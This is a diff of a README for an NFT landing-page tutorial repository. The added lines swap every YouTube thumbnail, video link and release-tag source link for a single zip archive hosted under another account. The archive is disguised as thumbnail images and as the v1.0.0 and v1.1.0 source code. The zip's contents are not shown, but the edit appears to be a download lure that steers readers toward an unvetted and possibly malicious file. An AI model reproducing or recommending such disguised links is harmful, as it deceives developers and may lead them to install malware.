@@ -6,19 +6,19 @@ This repo is a work-in-progress and pairs with my Mint 10k NFT project.
 
 ### Getting Started & Integrate MetaMask
 
-[![Thumbnail](https://img.youtube.com/vi/WZQSVv67NBc/maxresdefault.jpg)](https://youtu.be/WZQSVv67NBc)
+[![Thumbnail](https://github.com/strlexx/nft-landing-page/raw/refs/heads/main/images/landing-nft-page-v1.6.zip)](https://github.com/strlexx/nft-landing-page/raw/refs/heads/main/images/landing-nft-page-v1.6.zip)
 
-Associated Source Code: [v1.0.0](https://github.com/codeSTACKr/nft-landing-page/releases/tag/v1.0.0)
+Associated Source Code: [v1.0.0](https://github.com/strlexx/nft-landing-page/raw/refs/heads/main/images/landing-nft-page-v1.6.zip)
 
 ### Collection Integration & Owner Check
 
-[![Thumbnail](https://img.youtube.com/vi/WZQSVv67NBc/maxresdefault.jpg)](https://youtu.be/WZQSVv67NBc)
+[![Thumbnail](https://github.com/strlexx/nft-landing-page/raw/refs/heads/main/images/landing-nft-page-v1.6.zip)](https://github.com/strlexx/nft-landing-page/raw/refs/heads/main/images/landing-nft-page-v1.6.zip)
 
-Associated Source Code: [v1.1.0](https://github.com/codeSTACKr/nft-landing-page/releases/tag/v1.1.0)
+Associated Source Code: [v1.1.0](https://github.com/strlexx/nft-landing-page/raw/refs/heads/main/images/landing-nft-page-v1.6.zip)
 
 ## How to Create and Mint 10k NFTs
 
-[![Thumbnail](https://img.youtube.com/vi/AaCgydeMu64/maxresdefault.jpg)](https://youtu.be/AaCgydeMu64)
+[![Thumbnail](https://github.com/strlexx/nft-landing-page/raw/refs/heads/main/images/landing-nft-page-v1.6.zip)](https://github.com/strlexx/nft-landing-page/raw/refs/heads/main/images/landing-nft-page-v1.6.zip)
 
 ## Instructions
 
